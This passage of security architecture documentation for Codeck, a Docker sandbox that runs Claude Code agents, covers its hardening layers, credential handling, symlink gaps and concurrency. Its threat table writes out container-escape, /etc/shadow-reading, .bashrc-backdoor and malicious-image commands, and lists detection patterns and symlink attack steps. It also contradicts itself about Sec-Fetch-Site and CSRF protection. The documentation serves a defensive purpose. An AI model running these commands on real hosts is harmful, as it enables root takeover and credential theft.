│   │   ├── index/                    # SQLite FTS5 index
│   │   │   └── index.db
│   │   ├── state/                    # System state
│   │   │   ├── paths.json            # Path registry
│   │   │   └── flush-state.json      # Flush rate-limit state
│   │   └── skills/
│   │       ├── sandbox.md            # Sandbox-specific capabilities (tunnels, API, git, container)
│   │       └── docker.md             # Docker-in-Docker constraints and patterns
│   ├── CLAUDE.md                     # Layer 2 (from template), workspace rules + project list
│   └── <project>/                    # Cloned repos
│       └── .git/
│
├── root/
│   ├── .claude/                      # Mounted volume (mode 0700)
│   │   ├── .credentials.json         # OAuth token (AES-256-GCM encrypted, mode 0600)
│   │   ├── .pkce-state.json          # PKCE flow state (ephemeral, mode 0600)
│   │   ├── CLAUDE.md                 # Preset CLAUDE.md (Layer 1 — memory rules inline)
│   │   ├── mcp.json                  # MCP server config
│   │   └── settings.json             # CLI permissions (auto-generated)
│   ├── .claude.json                  # CLI config (onboarding, theme)
│   └── .ssh/                         # Mounted volume
│       ├── id_ed25519               # Private key (mode 0600)
│       ├── id_ed25519.pub           # Public key (mode 0644)
│       └── config                    # SSH config (StrictHostKeyChecking yes, pinned GitHub host keys)
│
└── usr/local/bin/
    ├── init-keyring.sh               # Initialization script
    └── claude                        # Claude Code CLI
```

---

## Security model

### Protection layers

```
                    Internet
                       │
              [Docker port mapping]
                       │
              ┌────────┴────────┐
              │  Container      │  cap_drop ALL, no-new-privileges
              │  Hardening      │  pids_limit 512, read_only filesystem
              │                 │  tmpfs: /tmp, /run, /run/dbus, /var/run
              └────────┬────────┘
                       │
        ┌──────────────┴──────────────┐ (gateway mode only)
        │  Daemon Auth Gate           │  Separate session store
        │  + Audit Log                │  All auth events logged (JSONL)
        │  + Rate Limiting            │  10/min auth, 60/min writes
        │  + Brute-force Lockout      │  5 attempts → 15min lockout
        └──────────────┬──────────────┘
                       │
              ┌────────┴────────┐
              │  Security Headers│  CSP, X-Frame-Options, X-Content-Type-Options
              │  (Helmet.js)     │  HSTS disabled (plain HTTP environment)
              └────────┬────────┘
                       │
              ┌────────┴────────┐
              │  Rate Limiter   │  10/min auth, 200/min general (runtime)
              │  (in memory)    │  5-min stale IP cleanup
              └────────┬────────┘
                       │
              ┌────────┴────────┐
              │  Password Auth  │  scrypt + salt, timing-safe compare
              │  (Bearer token) │  Sessions: 7-day TTL, in-memory Map
              └────────┬────────┘
                       │
              ┌────────┴────────┐
              │  Path Traversal │  resolve() + realpath() + startsWith()
              │  & Symlink      │  safePath() in file browser routes
              │  Protection     │  .codeck/ hidden from file browser
              └────────┬────────┘
                       │
              ┌────────┴────────┐
              │  Log Sanitizer  │  Removes: sk-ant-oat01-*, ghp_*, ghu_*
              └────────┬────────┘
                       │
              ┌────────┴────────┐
              │  File Perms     │  auth.json: 0600
              │                 │  .credentials.json: 0600
              │                 │  SSH keys: 0600/0644
              └─────────────────┘
```

### Attack surface and mitigations

| Vector | Mitigation |
|--------|------------|
| Brute-force password | Rate limiting (200/min on /api routes), account lockout (5 attempts, 15 min per IP), scrypt cost N=131072 (~300-500ms per hash) |
| Token leak in logs | `sanitize()` replaces token patterns with `***` |
| Path traversal in /api/files | `safePath()`: `resolve()` + `realpath()` + `startsWith(WORKSPACE+'/') ` check |
| Path traversal in /api/codeck | `safePath()`: `resolve()` + `realpath()` + `startsWith(AGENT_DATA_DIR+'/') ` check |
| Symlink-based traversal | `realpath()` resolves symlinks before validation in file browser routes; workspace export and preset system have known gaps (see KNOWN-ISSUES.md) |
| XSS via injected content | CSP blocks inline scripts, DOMPurify sanitizes markdown, Preact auto-escapes JSX |
| XSS via filenames | Frontend uses Preact (auto-escapes JSX) |
| Clickjacking | X-Frame-Options: DENY (CSP frame-ancestors: none) via Helmet.js |
| MIME sniffing attacks | X-Content-Type-Options: nosniff via Helmet.js |
| Filename injection in mkdir | Regex whitelist: `[a-zA-Z0-9_\-. ]`, strips leading dots |
| SSH MITM | `StrictHostKeyChecking yes` with pinned GitHub host keys (ed25519, ecdsa, rsa) |
| Zombie processes | `tini` as PID 1 reaps orphans |
| Fork bomb | `pids_limit: 512` in docker-compose |
| Stale OAuth login | 5 min timeout, auto-cleanup |
| CSRF (cross-site request forgery) | Bearer tokens in localStorage (not cookies), Sec-Fetch-Site header validation rejects cross-site requests, CORS blocks cross-origin custom headers |
| WebSocket without auth | Token query param validated on connect |
| Container escape | `cap_drop ALL` + minimal cap_add + `no-new-privileges` |
| Filesystem persistence attack | Read-only root filesystem (`read_only: true`) prevents malicious code from installing backdoors or modifying binaries. Writable paths limited to tmpfs (/tmp, /run) and explicit volumes (workspace, .codeck, .claude, .ssh) |
| Config file tampering | All Codeck data in `/workspace/.codeck/` — auth.json and config.json use mode 0600, agent data is readable |

### Agent Process Isolation

Proactive agents spawn via `child_process.spawn()` with a hardcoded binary path (`/usr/local/bin/claude`). Process-level isolation includes:

- **Environment allowlist** — Only safe variables passed through (`buildCleanEnv()`), secrets blocked (`ANTHROPIC_API_KEY`, `GITHUB_TOKEN`)
- **Environment value limits** — Per-variable max 10KB, total environment max 100KB to prevent environment bomb attacks
- **CWD validation** — Verified for existence and must be a directory (not a file)
- **Timeout enforcement** — SIGTERM → 15s grace → SIGKILL prevents runaway processes
- **Per-CWD locks** — Prevent concurrent execution in same workspace
- **No shell interpolation** — `spawn()` with args array, no `shell: true`

**Docker Socket Access — CRITICAL SECURITY NOTE**

The Docker socket is **not mounted** by default in either compose file. In isolated mode, it can be optionally enabled by uncommenting the volume line in `compose.isolated.yml`. In managed mode, port exposure is handled by the host daemon — no socket needed. If the Docker socket IS mounted:

- Agents can spawn privileged containers to gain root on host
- Agents can read logs and attach to other containers
- Agents can manipulate Docker networks and volumes

**Workspace Access — IMPORTANT**

Agent `cwd` configuration sets the **starting directory** only. Agents can access all files within `/workspace` via relative or absolute paths — CWD is not an access boundary.

**Agent Objective Linting:** When creating or updating agents, objectives are scanned for suspicious Docker patterns (e.g., `--privileged`, `nsenter`, host filesystem mounts). Warnings are returned in the API response (`lintWarnings` field) and logged server-side. This is advisory only — objectives are not blocked.

**Threat Model:** Codeck is a personal/team development sandbox, NOT a multi-tenant platform. Never run untrusted agent objectives. For security-sensitive deployments, use a Docker socket proxy (see `docs/CONFIGURATION.md`).

**Docker Socket Attack Vectors:**

| Attack | Command Example | Impact | Mitigation |
|--------|-----------------|--------|------------|
| Privileged container spawn | `docker run --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh` | Root on host | User trust + socket proxy |
| Host FS read | `docker run -v /:/host alpine cat /host/etc/shadow` | Credential theft | User trust + socket proxy |
| Host FS write | `docker run -v /:/host alpine sh -c 'echo backdoor >> /host/root/.bashrc'` | Persistent backdoor | User trust + socket proxy |
| Container attach | `docker exec -it other-container sh` | Lateral movement | Single-container deployment |
| Image manipulation | `docker pull malicious/image && docker run -d malicious/image` | Backdoor deployment | User image source trust |

**Defense Strategy:** Codeck relies on **user trust** as primary defense. Users must trust their own code, agent objectives, and team members. For environments where user trust is insufficient, deploy a socket proxy (see CONFIGURATION.md).

### CSRF Protection Strategy

Codeck uses **Bearer token authentication** instead of cookie-based sessions, which provides CSRF resistance through a different mechanism than traditional CSRF tokens.

**How Bearer Tokens Prevent CSRF:**

Traditional CSRF attacks exploit the browser's automatic inclusion of cookies in cross-origin requests. Codeck's approach eliminates this vector:

1. **Session tokens stored in localStorage** — Not accessible cross-origin (same-origin policy)
2. **Authorization header required** — `Authorization: Bearer <token>` not sent automatically by browser
3. **CORS enforcement** — Browser blocks cross-origin requests with custom headers unless server explicitly allows

**Attack scenario (blocked):**
- User authenticated at `http://localhost`, token in localStorage
- User visits attacker page at `http://evil.com`
- Attacker tries: `fetch('http://localhost/api/files/write', {method: 'POST', body: {...}})`
- ❌ Fails: No `Authorization` header = 401 Unauthorized
- Attacker cannot read token from localStorage (same-origin policy prevents cross-origin access)

**Defense-in-Depth Layers:**

1. **Bearer Token Architecture (Primary)**
   - Tokens in localStorage, not cookies
   - CORS prevents cross-origin custom headers

2. **WebSocket Origin Validation**
   - Validates `Origin` header on upgrade
   - Allows: localhost, *.codeck.local, codeck.local
   - Rejects: Cross-origin connections (HTTP 403)

3. **Content Security Policy**
   - Helmet CSP restricts `scriptSrc: ["'self']`
   - Prevents inline script injection
   - Blocks unauthorized script sources

4. **Rate Limiting**
   - Auth endpoints: 10 req/min per IP
   - General API: 200 req/min per IP
   - Account lockout: 5 failed attempts → 15min cooldown

**Known Limitations:**

- **Token Query Parameter Bypass** — Download endpoints accept `?token=...` (visible in browser history, server logs). Mitigated by planned one-time download tokens (AUDIT-66, AUDIT-97).
- **Malicious Browser Extensions** — Extensions can read localStorage and make authenticated requests (accepted risk, applies to all auth mechanisms).
- **No Sec-Fetch-Site Validation** — Modern CSRF defense (92% browser coverage) not yet implemented. Recommended in AUDIT-97.

**Why Not Traditional CSRF Tokens?**

Traditional CSRF tokens require cookie-based sessions. Since Codeck uses Bearer tokens:
- ❌ Double-submit cookie pattern requires cookies (Codeck has none)
- ❌ Synchronizer token pattern requires server-side session state (already have via Bearer tokens)
- ✅ Bearer tokens + planned Sec-Fetch-Site provide equivalent protection

**Future Considerations:**

If Codeck migrates to HttpOnly cookies (per AUDIT-66 deferral), implement:
1. SameSite=Lax or Strict cookie attribute
2. Synchronizer token pattern (CSRF tokens in forms)
3. Double-submit cookie for AJAX requests

See AUDIT-97 for comprehensive CSRF threat model analysis and implementation recommendations.

### Supply Chain Security

Codeck mitigates supply chain risks through:

- **Base image digest pinning** — `node:22-slim` pinned to immutable SHA256 digest in `docker/Dockerfile.base` prevents tag-swap attacks and ensures reproducible builds
- **npm lockfile** — `package-lock.json` (lockfile version 3) ensures reproducible dependency installs across all environments
- **Explicit version pinning** — Claude CLI (`@anthropic-ai/claude-code@2.1.39`) and security-critical packages pinned to exact versions rather than semver ranges

**Current Supply Chain Controls:**
- ✅ Docker base image digest pinning (prevents tag-swap, documented update process in docker/Dockerfile.base comments)
- ✅ Claude CLI version pinning (prevents supply chain drift, manual update policy)
- ✅ npm package lockfile (reproducible installs, version consistency)
- ✅ Minimal base image (`node:22-slim` reduces attack surface vs full Node image)

**Missing Supply Chain Controls:**
- ❌ No automated vulnerability scanning (Trivy, Grype, Snyk, Docker Scout)
- ❌ No base image provenance verification (SLSA attestations available but not verified)
- ❌ No image signing or attestation for distributions
- ❌ No automated dependency update notifications (Renovate, Dependabot)
- ❌ No SBOM (Software Bill of Materials) generation

**Base Image Update Policy:**

Digest pinning provides reproducible builds at the cost of delayed security patches. To balance security and stability:

- **Update cadence:** Monthly verification against Docker Hub (see docker/Dockerfile.base line 6 comments)
- **Last verified:** 2026-02-14 (digest sha256:5373f1906319...)
- **Security-critical CVEs:** May warrant immediate update (monitor Debian Security Advisories)
- **Update procedure:** Documented in AUDIT-110 (Docker Base Image CVE Scan) and CONFIGURATION.md

**Verification command:**
```bash
# Check current digest on Docker Hub
curl -s "https://hub.docker.com/v2/repositories/library/node/tags/22-slim" | jq -r '.digest'

# Pull and inspect
docker pull node:22-slim
docker inspect node:22-slim | jq -r '.[0].RepoDigests[0]'
```

For vulnerability scanning and update procedures, see CONFIGURATION.md "Supply Chain Security" section and AUDIT-95 for detailed analysis.

### Git credential handling

Codeck uses two credential mechanisms:

**1. Askpass for Clone Operations (Ephemeral)**
- Token stored in `/tmp/git-askpass-{random}.token` (mode 0o600)
- Script at `/tmp/git-askpass-{random}.sh` reads token via `cat`
- `GIT_ASKPASS` env variable points git to script
- `GIT_TERMINAL_PROMPT=0` disables interactive fallback (phishing defense)
- Files cleaned up after clone completes (both success and error paths)

**2. Credential Store for Push/Pull (Persistent)**
- Tokens written to `~/.git-credentials` (mode 0o600)
- Git credential helper: `store --file=/root/.git-credentials`
- Format: `https://{token}@{host}` (plaintext)
- No expiry validation (limitations documented in KNOWN-ISSUES.md)

**Security properties:**
- Askpass tokens never appear in process arguments (`ps` safe)
- Random filenames prevent race conditions (< 0.000001% collision probability)
- Control character blocking defends against Clone2Leak (CVE-2024-50349, CVE-2024-52006)
- Credentials isolated from workspace export (stored in `/root`, not `/workspace`)
- All git commands use `spawnSync()` with array arguments and `--` separator

**Limitations:**
- Credentials stored in plaintext (acceptable for single-user dev tool)
- No token expiry validation (expired tokens cause "Authentication failed" error)
- Single credential per host (multi-account requires manual management)

### Path validation & symlink security

Codeck implements symlink resolution to prevent path traversal attacks via symbolic links. The security model varies across subsystems:

**File Browser Routes (Strong Protection)**
- `files.routes.ts` and `codeck.routes.ts` use `safePath()` helper
- Pattern: `path.resolve()` → `fs.realpath()` → `startsWith()` check
- Validates symlink targets stay within workspace bounds
- Handles non-existent paths (for write/mkdir) by falling back to resolved path

**Workspace Export (Known Gap — MEDIUM)**
- `tar` command follows symlinks by default (no `--no-dereference` flag)
- Symlinks inside `/workspace` are dereferenced and contents included in archive
- Exclusion list (`--exclude=.codeck/auth.json`) operates on symlink path, not target
- **Attack vector**: Create symlink to sensitive file, export archive, extract on host to leak credentials
- Mitigation tracked in KNOWN-ISSUES.md

**Preset System (Known Gap — MEDIUM)**
- Destination paths validated via `resolve()` but NOT `realpath()`
- If destination directory is a symlink, writes follow symlink to arbitrary location
- Source paths are validated with `realpath()` equivalent checks
- **Attack vector**: Create symlink at `/workspace/.codeck/rules → /tmp/evil`, preset writes follow symlink
- Mitigation tracked in KNOWN-ISSUES.md

**Project Management (Minimal Risk)**
- No symlink resolution on `POST /api/project/create` or `POST /api/project/clone`
- `WORKSPACE` base directory is trusted (set at container startup, not user-controlled)
- Severity LOW in single-user container context

**TOCTOU Race Conditions**
- Theoretical gap between `realpath()` validation and file operation
- Mitigated by Node.js single-threaded event loop (no parallel execution)
- Attack requires container access + nanosecond timing
- Severity VERY LOW in Codeck's threat model

**References:**
- [CWE-61: UNIX Symbolic Link Following](https://cwe.mitre.org/data/definitions/61.html)
- [CWE-59: Improper Link Resolution](https://cwe.mitre.org/data/definitions/59.html)
- [OWASP Node.js Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html)

### Known limitations

- **No native HTTPS** — A reverse proxy or tunnel is assumed for TLS
- **In-memory rate limiter** — Lost on restart; does not protect against distributed DDoS
- **No CSRF protection** — Endpoints are pure API (no forms), mitigated by Bearer token
- **WebSocket token in query string** — Visible in server logs; standard pattern for WS auth

---

## Caching and in-memory state

| Cache | TTL | Invalidation | Purpose |
|-------|-----|--------------|---------|
| `claudeInstalled` | Permanent (null → boolean) | Never (does not change at runtime) | Avoid repeated `execSync('claude --version')` |
| `gitInstalled` | Permanent | Never | Avoid repeated `execSync('git --version')` |
| `ghInstalled` | Permanent | Never | Avoid repeated `execSync('gh --version')` |
| `authCache` | 3s | `invalidateAuthCache()` after successful login | Avoid reading `.credentials.json` on every request |
| `sshTestCache` | 30s | `invalidateSSHCache()` after generating key | Avoid `ssh -T git@github.com` on every status check |
| `claudeUsage` | 60s | Auto-expiry | Avoid hammering `api.anthropic.com/api/oauth/usage` |
| `activeSessions` (auth) | 7 days per session | Login generates new, logout deletes | Session tokens for password auth |
| `requestCounts` (rate limit) | 60s sliding window | Auto-reset on next request from same IP | Request count per IP |
| `logBuffer` | 100 entries (circular) | `shift()` when exceeded | Log history for new WS clients |
| `prevCpuUsage` (resources) | N/A (running delta) | Never | CPU percentage delta calculation from cgroups |

---

## Concurrency & State Management

### Node.js Concurrency Model

Codeck runs on a **single Node.js process with a single-threaded event loop**. While this eliminates multi-threading concurrency issues (no mutex needed for CPU-bound operations), **asynchronous I/O creates race conditions** through event loop interleaving.

**Key Principle:** When an async operation pauses (e.g., `await fs.readFile()`), the event loop can process other requests. If those requests modify shared state, the resumed operation sees stale data.

**Example Race Condition:**
```typescript
// Request A starts
const config = readConfig();  // Read: { foo: 1 }
await someAsyncOperation();   // ← Event loop processes Request B here
config.foo = 2;
writeConfig(config);          // Write: { foo: 2 } (overwrites B's change)

// Request B (concurrent)
const config = readConfig();  // Read: { foo: 1 }
config.foo = 3;
writeConfig(config);          // Write: { foo: 3 } (lost when A writes)
```

Result: Request B's update is lost (classic lost update problem).

### In-Memory State Patterns

**Current In-Memory State (Mutable Maps/Variables):**

| Service | State | Mutation Pattern | Concurrency Protection |
|---------|-------|------------------|------------------------|
| `console.ts` | `sessions: Map<string, Session>` | Add/remove sessions, mutate session properties | ❌ None — concurrent mutations can corrupt state |
| `auth.ts` | `activeSessions: Map<string, SessionData>` | Add/remove sessions | ❌ None — iteration during mutation can skip sessions |
| `proactive-agents.ts` | `agents: Map<string, AgentRuntime>` | Add/remove agents, update execution state | ✅ Per-CWD locks prevent concurrent execution in same directory |
| `memory.ts` | `activeLocks: Set<string>` | Add/remove file locks | ✅ Synchronous lock enforcement (canary for re-entrant writes) |
| `websocket.ts` | `clients: Set<WebSocket>` | Add/remove WS connections | ✅ Synchronous add/remove, no async gaps |

**Analysis:**
- **Good:** `proactive-agents.ts` uses per-CWD locks (`cwdLocks` map) to prevent concurrent execution
- **Good:** `memory.ts` uses `withWriteLock()` to detect re-entrant writes (throws error if lock already held)
- **Weakness:** `console.ts` session mutations (e.g., `markSessionAttached()`) have no locking — concurrent attach from two tabs can corrupt output buffer
- **Weakness:** `auth.ts` session persistence iterates `activeSessions` map without locking — concurrent login/logout can skip sessions or fail iteration

### File-Based Persistence Patterns

**Atomic Write Pattern (GOOD):**
```typescript
// From memory.ts:10-15
function atomicWriteFileSync(filePath: string, data: string): void {
  const dir = dirname(filePath);
  const tmpPath = join(dir, `.tmp-${randomBytes(6).toString('hex')}`);
  writeFileSync(tmpPath, data);          // Write to temp file
  renameSync(tmpPath, filePath);         // Atomic rename (POSIX guarantee)
}
```

**Why This Works:** On POSIX systems, `rename()` is atomic. Readers always see either old or new content, never partial writes. Prevents corruption from crashes mid-write.

**Used In:**
- `memory.ts` — All memory system writes (paths.json, flush_state.json, MEMORY.md)
- `console.ts` — Session state persistence (sessions.json in .codeck/state/)

**NOT Yet Used (Known Tech Debt):**
- `auth.ts` — auth.json and sessions.json use direct writeFileSync (corruption risk)
- `proactive-agents.ts` — manifest.json, config.json, state.json use direct writeFileSync
- `auth-anthropic.ts` — .credentials.json and .pkce-state.json use direct writeFileSync

**Impact:** Non-atomic writes risk corruption on crash during write. For auth/session files, this can lock users out. For agent state, it can cause orphaned processes or schedule desync. Severity is HIGH in context (dev tool, single-user), not CRITICAL (not multi-tenant, re-auth available).

**Atomic Operation Pattern (FIXED — IMPL-106):**
```typescript
// From project.routes.ts — atomic mkdir with EEXIST handling
try {
  mkdirSync(fullPath, { recursive: false });  // Atomic: fails if exists
  res.json({ success: true });
} catch (err) {
  if (err.code === 'EEXIST') {
    res.status(409).json({ error: 'Already exists' });
  } else {
    res.status(500).json({ error: 'Failed to create directory' });
  }
}
```

**Pattern:** Replace check-then-act with atomic operation + error handling. The operation itself is the check — no race window. Applied to `project.routes.ts` (create, clone), `files.routes.ts` (mkdir, write), `codeck.routes.ts` (readdir), and `memory-indexer.ts` (file watcher).

**Fix:** Use atomic operation instead:
```typescript
try {
  mkdirSync(fullPath, { recursive: false });  // Fail if exists (atomic)
  res.json({ success: true });
} catch (err) {
  if (err.code === 'EEXIST') {
    res.status(409).json({ error: 'Already exists' });
  } else {
    throw err;
  }
}
```

### Known Race Conditions

**See:** `docs/auditory/AUDIT-106-race-condition-audit.md` for comprehensive analysis.

**Critical Issues:**
1. **TOCTOU in directory creation** (`project.routes.ts:25-32`, `files.routes.ts:163-172`) — Concurrent requests bypass "already exists" check
2. **TOCTOU in git clone** (`project.routes.ts:68-72`) — Directory created between check and clone operation
3. **Session output buffer race** (`console.ts:194-201`) — Concurrent attach calls can corrupt buffer

**Mitigation Strategy:**
- Replace existence checks with atomic operations (EEXIST error handling)
- Add mutex for multi-step operations (install `async-mutex` library)
- Document concurrency assumptions in function comments

### Best Practices for Adding Stateful Operations

When adding new code that mutates shared state:

1. **Prefer stateless operations** — Operate on files/database, not in-memory state
2. **If state is needed:**
   - Single synchronous mutation → OK (e.g., `map.set(key, value)`)
   - Multiple mutations with async gaps → **Use mutex** (e.g., `async-mutex` library)
3. **File operations:**
   - Single file write → Use `atomicWriteFileSync()` pattern
   - Check-then-act → **Replace with atomic operation + error handling**
4. **Document concurrency:**
   ```typescript
   /**
    * CONCURRENCY: NOT thread-safe. Use mutex if calling from concurrent contexts.
    */
   export function mutateSharedState() { ... }
   ```

**Mutex Example (async-mutex):**
```typescript
import { Mutex } from 'async-mutex';
const configMutex = new Mutex();

export async function updateConfig(changes: Partial<Config>) {
  return configMutex.runExclusive(() => {
    const config = readConfig();      // Read
    Object.assign(config, changes);   // Modify
    writeConfig(config);              // Write
    return config;
  });
}
```

**Why This Works:** Mutex guarantees exclusive access. Second request waits for first to complete before reading config.

---

## Module dependencies

### Runtime

```
apps/runtime/src/index.ts
    └── web/server.ts
            ├── services/mdns.ts
            ├── web/logger.ts
            ├── web/websocket.ts
            │       ├── services/claude.ts
            │       ├── services/git.ts
            │       ├── services/console.ts
            │       ├── services/auth.ts
            │       └── web/logger.ts
            ├── services/auth.ts
            ├── services/claude.ts
            ├── services/git.ts
            ├── services/console.ts
            ├── services/preset.ts
            ├── services/port-manager.ts
            ├── routes/claude.routes.ts
            │       ├── services/claude.ts
            │       └── web/websocket.ts
            ├── routes/codeck.routes.ts
            │       └── (direct fs)
            ├── routes/console.routes.ts
            │       ├── services/claude.ts
            │       └── services/console.ts
            ├── routes/dashboard.routes.ts
            │       ├── services/resources.ts
            │       │       └── services/console.ts
            │       └── services/claude-usage.ts
            ├── routes/files.routes.ts
            │       └── (direct fs)
            ├── routes/git.routes.ts
            │       ├── services/git.ts
            │       └── web/websocket.ts
            ├── routes/github.routes.ts
            │       ├── services/git.ts
            │       └── web/websocket.ts
            ├── routes/memory.routes.ts
            │       └── (direct fs)
            ├── routes/preset.routes.ts
            │       ├── services/preset.ts
            │       ├── services/git.ts
            │       └── web/websocket.ts
            ├── routes/project.routes.ts
            │       ├── services/git.ts
            │       └── web/websocket.ts
            ├── routes/ssh.routes.ts
            │       └── services/git.ts
            ├── routes/system.routes.ts
            │       └── services/port-manager.ts
            ├── routes/workspace.routes.ts
            │       └── (direct child_process)
            └── routes/agents.routes.ts
                    └── services/proactive-agents.ts
                            ├── services/claude-env.ts
                            └── services/permissions.ts
```

**Circular dependency avoided:** `websocket.ts` exports `broadcastStatus()` which routes import. Services never import from routes or web — they only export pure functions.

### Daemon

```
apps/daemon/src/index.ts
    └── server.ts
            ├── services/auth.ts          → Password validation, session management
            ├── services/audit.ts         → Append-only JSONL audit log
            ├── services/rate-limit.ts    → Per-IP sliding window + brute-force lockout
            ├── services/proxy.ts         → HTTP reverse proxy to runtime
            └── services/ws-proxy.ts      → WebSocket upgrade + bidirectional pipe to runtime
```

The daemon has zero imports from the runtime — communication is HTTP/WS over the network.
